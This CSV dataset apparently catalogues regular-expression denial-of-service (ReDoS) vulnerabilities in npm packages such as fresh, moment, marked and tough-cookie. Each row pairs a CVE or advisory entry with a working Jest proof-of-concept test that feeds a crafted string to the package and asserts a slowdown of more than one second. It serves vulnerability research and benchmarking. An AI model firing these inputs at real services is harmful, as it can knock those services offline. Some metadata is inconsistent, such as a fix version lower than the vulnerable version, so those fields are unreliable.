Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
redos,CVE-2017-16119,fresh,0.5.0,0.5.2,redos/fresh_0.5.0,"test(""ReDos in fresh"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  var fresh = require(""fresh"");
  let str = genstr(60000, "" "") + ""x"";
  let t = measureTime(function () {
    fresh({ ""if-none-match"": str }, { etag: 23 });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jshttp/fresh/commit/21a0f0c2a5f447e0d40bc16be0c23fa98a7b46ec,index.js:61:40,https://security.snyk.io/vuln/npm:fresh:20170908; https://github.com/advisories/GHSA-9qj9-36jm-prpv
redos,CVE-2021-23353,jspdf,2.1.1,2.3.1,redos/jspdf_2.1.1,"test(""ReDos in jspdf"", () => {
  const measureTime = require(""../utils"").measureTime;
  const { jsPDF } = require(""jspdf"");
  const doc = new jsPDF();
  doc.text(""Hello world"", 10, 10);
  let t = measureTime(function () {
    try {      
      doc.addImage(""data:image/jpeg;"" + ""charset=x"".repeat(25) + ""!base64,"", 'JPEG', 1, 2);
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/MrRio/jsPDF/commit/d8bb3b39efcd129994f7a3b01b632164144ec43e,jspdf.node.min.js:86:5935,https://security.snyk.io/vuln/SNYK-JS-JSPDF-1073626; https://github.com/advisories/GHSA-57f3-gghm-9mhc
redos,CVE-2017-16099,no-case,2.3.1,2.3.2,redos/no-case_2.3.1,"test(""ReDos in no-case"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const cc = require(""no-case"");
  let t = measureTime(function () {
    cc(genstr(50000, ""X""));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,no-case.js:34:6,https://security.snyk.io/vuln/npm:no-case:20170908; https://github.com/advisories/GHSA-ff6r-5jwm-8292
redos,,platform,1.3.4,,redos/platform_1.3.4,"test(""ReDos in platform"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const platform = require(""platform"");
  let t = measureTime(function () {
    var agent = platform.parse(""Windows Icarus6j"" + genstr(40000, "" "") + "" "");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,platform.js:117:10,https://security.snyk.io/vuln/npm:platform.js:20170907; 
redos,CVE-2021-23343,path-parse,1.0.6,1.0.7,redos/path-parse_1.0.6,"function build_attack(n) {
  var ret = """";
  for (var i = 0; i < n; i++) {
    ret += ""/"";
  }
  return ret + ""\u25CE"";
}
test(""ReDos in path-parse"", () => {
  const measureTime = require(""../utils"").measureTime;
  const pathParse = require(""path-parse"");
  let t = measureTime(function () {
    let attack_str = build_attack(50000);
    pathParse(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:59:22,https://security.snyk.io/vuln/SNYK-JS-PATHPARSE-1077067; https://github.com/advisories/GHSA-hj48-42vr-x3v9
redos,,ramda,0.27.1,0.27.2,redos/ramda_0.27.1,"//https://www.huntr.dev/bounties/51dfe927-1bf1-4b36-91ca-2197337e663a/
test(""ReDos in ramda"", () => {
  const { trim } = require(""ramda"");
  const measureTime = require(""../utils"").measureTime;
  let attack_str = ""a"" + "" "".repeat(33000) + ""a"";

  let t = measureTime(function () {
    trim(build_blank(50000));
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});

function build_blank(n) {
  var ret = ""1"";
  for (var i = 0; i < n; i++) {
    ret += "" "";
  }

  return ret + ""1"";
}
",https://github.com/ramda/ramda/commit/37af6ae2ca8b94656996dd27fb0a1f208d69134e,trim.js:33:35,; https://security.snyk.io/vuln/SNYK-JS-RAMDA-1582370
redos,CVE-2015-8315,millisecond,0.1.1,0.1.2,redos/millisecond_0.1.1,"test(""ReDos in millisecond"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  var ms = require(""millisecond"");
  let attack_str = genstr(20000, ""1"") + ""x"";
  let t = measureTime(function () {
    ms(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:43:21,https://security.snyk.io/vuln/npm:millisecond:20151120; https://github.com/advisories/GHSA-3fx5-fwvr-xrjg
redos,,papaparse,5.1.1,5.2.0,redos/papaparse_5.1.1,"test(""ReDos in ssri"", () => {
  const measureTime = require(""../utils"").measureTime;
  const Papa = require(""papaparse"");
  const input = ""0"".repeat(30000);
  const options = { dynamicTyping: true };
  let t = measureTime(function () {
    Papa.parse(input + ""a"", options);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/mholt/PapaParse/commit/235a12758cd77266d2e98fd715f53536b34ad621,papaparse.js:1142:14,https://security.snyk.io/vuln/SNYK-JS-PAPAPARSE-564258; https://github.com/advisories/GHSA-qvjc-g5vr-mfgr
redos,,rgb2hex,0.1.0,0.1.6,redos/rgb2hex_0.1.0,"//https://hackerone.com/reports/319629
test(""ReDos in rgb2hex"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const rgb2hex = require(""rgb2hex"");

  const color = ""rgb("" + genstr(14, ""0000,"") + ""000"";

  let t = measureTime(function () {
    try {
      rgb2hex(color);
    } catch {}
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",,index.js:25:73,https://security.snyk.io/vuln/npm:rgb2hex:20180429; https://github.com/advisories/GHSA-65p8-3hm4-h9h8
redos,,conventional-commits-parser,3.2.0,3.2.3,redos/conventional-commits-parser_3.2.0,"test(""ReDos in conventional-commits-parser"", () => {
  const measureTime = require(""../utils"").measureTime;
  const conventionalCommitsParser = require(""conventional-commits-parser"");
  let payload = ""b"" + ""\r\n"".repeat(2000000) + ""b"";
  let t = measureTime(function () {
    conventionalCommitsParser(payload);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/conventional-changelog/conventional-changelog/commit/c696fa35f93e0ee13728d6cf1221587ac6386311,,https://github.com/conventional-changelog/conventional-changelog/pull/861/commits/2fcd2d4e2a05986b3cd410d2d0db7d975ccca0f1; https://security.snyk.io/vuln/SNYK-JS-CONVENTIONALCOMMITSPARSER-1766960
redos,,content,3.0.5,4.0.4,redos/content_3.0.5,"test(""ReDoS in content"", () => {
  const measureTime = require(""../utils"").measureTime;
  const content = require(""content"");
  let t = measureTime(function () {
    content.disposition(""form-data;x"" + "" "".repeat(2000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/hapijs/content/commit/96beb34f7c38a08d024dbf9cd63865c56e2955d9,index.js:84:34,https://security.snyk.io/vuln/npm:content:20180305; https://github.com/advisories/GHSA-x6wp-rfwh-hcx7
redos,,content-type-parser,1.0.1,,redos/content-type-parser_1.0.1,"test(""ReDoS in content-type-parser"", () => {
  const measureTime = require(""../utils"").measureTime;
  const contentTypeParser = require(""content-type-parser"");
  let t = measureTime(function () {
    contentTypeParser(""/"".repeat(30000) + ""\r\n"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jsdom/whatwg-mimetype/commit/26c539a699778f8743b8319c298b5fb28a4328d0,content-type-parser.js:61:46,https://security.snyk.io/vuln/npm:content-type-parser:20170905; 
redos,,natural,5.1.0,5.1.11,redos/natural_5.1.0,"test(""ReDos in natural"", () => {
  const measureTime = require(""../utils"").measureTime;
  const diceCoefficient = require(""natural/lib/natural/distance/dice_coefficient.js"");
  let attack_str = ""a"" + "" "".repeat(33000) + ""a"";
  let t = measureTime(function () {
    diceCoefficient(attack_str, attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/NaturalNode/natural/commit/90e85afb20e76560bc555d83abad3bc919388381,dice_coefficient.js:54:28,https://github.com/NaturalNode/natural/issues/625; https://security.snyk.io/vuln/SNYK-JS-NATURAL-1915418
redos,CVE-2021-3868,prompts,2.4.0,2.4.2,redos/prompts_2.4.0,"//https://security.snyk.io/vuln/SNYK-JS-PROMPTS-1729737
test(""ReDos in prompts"", () => {
  const measureTime = require(""../utils"").measureTime;
  const strip = require(""prompts/lib/util/strip.js"");

  let attack_str = ""\u001B["" + "";"".repeat(16000);

  let t = measureTime(function () {
    strip(attack_str);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",,strip.js:10:40,https://security.snyk.io/vuln/SNYK-JS-PROMPTS-1729737; 
redos,CVE-2020-27511,prototype,0.0.5,,redos/prototype_0.0.5,"test(""ReDos in prototype"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const prototype = require(""prototype/lib/String"");
  let t = measureTime(function () {
    let attack_str = ""hello <span> <a "" + genstr(37, ""'"") + ""!"";
    attack_str.stripTags();
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,String.js:84:17,https://github.com/yetingli/PoCs/blob/main/CVE-2020-27511/Prototype.md; 
redos,,vant,2.12.11,3.0.7,redos/vant_2.12.11,"test(""ReDos in vant"", () => {
  const isEmail = require(""vant/lib/utils/validate/email"").isEmail;
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    var check = isEmail(
      ""a@0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.""
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,email.js:9:14,https://securitylab.github.com/advisories/GHSL-2020-343-redos-Vant/; 
redos,,html-dom-parser,0.1.2,0.1.3,redos/html-dom-parser_0.1.2,"test(""ReDos in html-dom-parser"", () => {
  const parse = require(""html-dom-parser"");
  const measureTime = require(""../utils"").measureTime;
  const genstr = require(""../utils"").genstr;
  let attack_str = ""<head"" + genstr(4000000, "" S"");
  let t = measureTime(function () {
    parse(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/remarkablemark/html-dom-parser/commit/b80d699bbbd45d254379e6916152c918998e3b10,,https://security.snyk.io/vuln/npm:html-dom-parser:20180220; 
redos,CVE-2017-15010,tough-cookie,2.3.2,2.3.3,redos/tough-cookie_2.3.2,"test(""ReDos in tough-cookie"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const tough = require(""tough-cookie"");
  let str = ""x"" + genstr(50000, "" "") + ""x"";
  let Cookie = tough.Cookie;
  let t = measureTime(function () {
    var cookie = Cookie.parse(str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,cookie.js:330:23,https://security.snyk.io/vuln/npm:tough-cookie:20170905; https://github.com/advisories/GHSA-g7q5-pjjr-gqvp
redos,CVE-2022-21670,markdown-it,9.1.0,12.3.2,redos/markdown-it_9.1.0,"test(""ReDos in markdown-it"", () => {
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    require(""markdown-it"")(""commonmark"").parse(""*_"".repeat(60000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/markdown-it/markdown-it/commit/ffc49ab46b5b751cd2be0aabb146f2ef84986101,,https://security.snyk.io/vuln/SNYK-JS-MARKDOWNIT-2331914; 
redos,CVE-2021-23371,chrono-node,2.2.3,2.2.4,redos/chrono-node_2.2.3,"test(""ReDoS in chrono-node"", () => {
  const measureTime = require(""../utils"").measureTime;
  const chrono = require(""chrono-node"");
  let attack_str = ""BGR3"" + "" "".repeat(40000) + ""186'"";
  let t = measureTime(function () {
    chrono.parse(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/wanasit/chrono/commit/98815b57622443b5c498a427210ebd603d705f4c,chrono.js:42:29,https://security.snyk.io/vuln/SNYK-JS-CHRONONODE-1083228; https://github.com/advisories/GHSA-hpmr-g4pq-jhgp
redos,CVE-2021-21306,marked,0.3.6,2.0.0,redos/marked_0.3.6,"test(""ReDos in marked"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const marked = require(""marked"");
  let str = genstr(8, ""`"") + genstr(700, "" "") + genstr(11, ""`"");
  let t = measureTime(function () {
    var agent = marked(str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/markedjs/marked/commit/7293251c438e3ee968970f7609f1a27f9007bccd,marked.js:662:31,https://security.snyk.io/vuln/SNYK-JS-MARKED-1070800; https://github.com/advisories/GHSA-4r62-v4vq-hr96
redos,CVE-2021-23392,locutus,2.0.10,2.0.15,redos/locutus_2.0.10,"test(""ReDos in locutus"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const inet_pton = require(""locutus/php/network/inet_pton"");
  const attack_str = new Array(30).fill(""a"").join("""") + ""."";
  let t = measureTime(function () {
    inet_pton(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/locutusjs/locutus/commit/eb863321990e7e5514aa14f68b8d9978ece9e65e,inet_pton.js:30:9,https://security.snyk.io/vuln/SNYK-JS-LOCUTUS-1090597; https://github.com/advisories/GHSA-39q4-p535-c852
redos,,simple-markdown,0.7.2,0.6.1,redos/simple-markdown_0.7.2,"test(""ReDos in simple-markdown"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const SimpleMarkdown = require(""simple-markdown"");
  const mdParse = SimpleMarkdown.defaultBlockParse;
  let t = measureTime(function () {
    mdParse(
      ""~~\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}}~""
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/Khan/simple-markdown/commit/015a719bf5cdc561feea05500ecb3274ef609cd2,simple-markdown.js:492:26,https://security.snyk.io/vuln/SNYK-JS-SIMPLEMARKDOWN-469242; https://github.com/advisories/GHSA-qj3f-9gmq-fwv5
redos,CVE-2017-16138,mime,1.4.0,2.0.3,redos/mime_1.4.0,"test(""ReDos in mime"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const mime = require(""mime"");
  let str = genstr(81750, ""5"") + """";
  let t = measureTime(function () {
    mime.lookup(str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/broofa/node-mime/commit/1df903fdeb9ae7eaa048795b8d580ce2c98f40b0,mime.js:70:18,https://security.snyk.io/vuln/npm:mime:20170907; https://github.com/advisories/GHSA-wrvr-8mpx-r7pp
redos,,sanitize,2.0.0, 2.1.0,redos/sanitize_2.0.0,"test(""ReDos in sanitize"", () => {
  const measureTime = require(""../utils"").measureTime;
  const sanitize = require(""sanitize"");
  const sanitizer = sanitize();
  let t = measureTime(function () {
    sanitizer.my.url(""a"" + (""."" + ""a"".repeat(55)).repeat(4) + ""#"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/pocketly/node-sanitize/commit/4fd57530367ea9f2570b1e57d1a1a32e7f5d644f#diff-bd042f5439b55acdcce363c79e2f55d6R148,Sanitizer.js:148:37,https://security.snyk.io/vuln/npm:sanitize:20180225; 
redos,CVE-2017-18077,brace-expansion,1.1.6,1.1.7,redos/brace-expansion_1.1.6,"test(""ReDoS in brace-expansion"", () => {
  const expand = require(""brace-expansion"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    expand(""{"" + "","".repeat(24) + ""\n}"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/juliangruber/brace-expansion/pull/35/commits/b13381281cead487cbdbfd6a69fb097ea5e456c3,index.js:109:35,https://security.snyk.io/vuln/npm:brace-expansion:20170302; https://github.com/advisories/GHSA-832h-xg76-4gv6
redos,CVE-2020-26289,date-and-time,0.14.1,0.14.2,redos/date-and-time_0.14.1,"test(""ReDoS in date-and-time"", () => {
  const measureTime = require(""../utils"").measureTime;
  const date = require(""date-and-time"");
  let attack_str = ""["" + ""z"".repeat(25) + """";
  let t = measureTime(function () {
    date.compile(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/knowledgecode/date-and-time/commit/9e4b501eacddccc8b1f559fb414f48472ee17c2a,date-and-time.js:141:27,https://security.snyk.io/vuln/SNYK-JS-DATEANDTIME-1054430; https://github.com/advisories/GHSA-r92x-f52r-x54g
redos,CVE-2017-18214,moment,2.18.1,2.19.3,redos/moment_2.18.1,"test(""ReDos in moment"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const moment = require(""moment"");
  let str = genstr(50000, ""1"") + """";
  let t = measureTime(function () {
    moment(str, ""MMM"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,moment.js:2364:31,https://security.snyk.io/vuln/npm:moment:20170905; https://github.com/advisories/GHSA-446m-mv8f-q348
redos,,email-existence,0.1.5,0.1.6,redos/email-existence_0.1.5,"test(""ReDos in email-existence"", () => {
  const measureTime = require(""../utils"").measureTime;
  const emailExistence = require(""email-existence"");
  let t = measureTime(function () {
    emailExistence.check(""@"".repeat(50000) + "" "", () => {});
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/nmanousos/email-existence/commit/0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56,index.js:8:19,https://security.snyk.io/vuln/npm:email-existence:20180225; 
redos,,markdown-to-jsx,5.4.2,,redos/markdown-to-jsx_5.4.2,"test(""ReDos in markdown-to-jsx"", () => {
  const { compiler } = require(""markdown-to-jsx"");
  const measureTime = require(""../utils"").measureTime;
  const { genstr } = require(""../utils"");
  attack_str = '<a foobar=""foo' + genstr(90000, ""\\!"") + ""/>"";
  let t = measureTime(function () {
    compiler(attack_str, { disableParsingRawHTML: false });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,,https://securitylab.github.com/advisories/GHSL-2020-300-redos-markdown-to-jsx/; 
redos,,d3-color,2.0.0,,redos/d3-color_2.0.0,"test(""ReDoS in d3-color"", () => {
  const measureTime = require(""../utils"").measureTime;
  const d3Color = require(""d3-color"");
  let attack_str = ""rgb("" + ""1"".repeat(80000) + ""!"";
  let t = measureTime(function () {
    d3Color.rgb(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/d3/d3-color/commit/4c2be7e59a317d0af7c3d66e44fa888f02163a59,d3-color.js:221:27,https://security.snyk.io/vuln/SNYK-JS-D3COLOR-1076592; 
redos,,highlight.js,10.4.0,10.4.1,redos/highlight.js_10.4.0,"test(""ReDos in highlight.js"", () => {
  const measureTime = require(""../utils"").measureTime;
  let hljs = require(""highlight.js/lib/core"");
  let r = require(""highlight.js/lib/languages/r"");
  hljs.registerLanguage(""r"", r);
  let t = measureTime(function () {
    hljs.highlight(
      ""r"",
      ""#' @param `x"" + ""\\_"".repeat(22) + ""_ code{numeric} foobar""
    ).value;
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/highlightjs/highlight.js/commit/373b9d862401162e832ce77305e49b859e110f9c,core.js:858:36,https://security.snyk.io/vuln/SNYK-JS-HIGHLIGHTJS-1048676; https://github.com/advisories/GHSA-vfrc-7r7c-w9mx
redos,,is-my-json-valid,2.20.1,2.20.2,redos/is-my-json-valid_2.20.1,"test(""ReDos in is-my-json-valid"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const imjv = require(""is-my-json-valid"");
  const validate = imjv({
    maxLength: 100,
    format: ""style"",
  });
  let t = measureTime(function () {
    validate("" "".repeat(4000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/mafintosh/is-my-json-valid/commit/c3fc04fc455d40e9b29537f8e2c73a28ce106edb,index.js:172:21,https://security.snyk.io/vuln/SNYK-JS-ISMYJSONVALID-597165; https://github.com/advisories/GHSA-f522-ffg8-j8r6
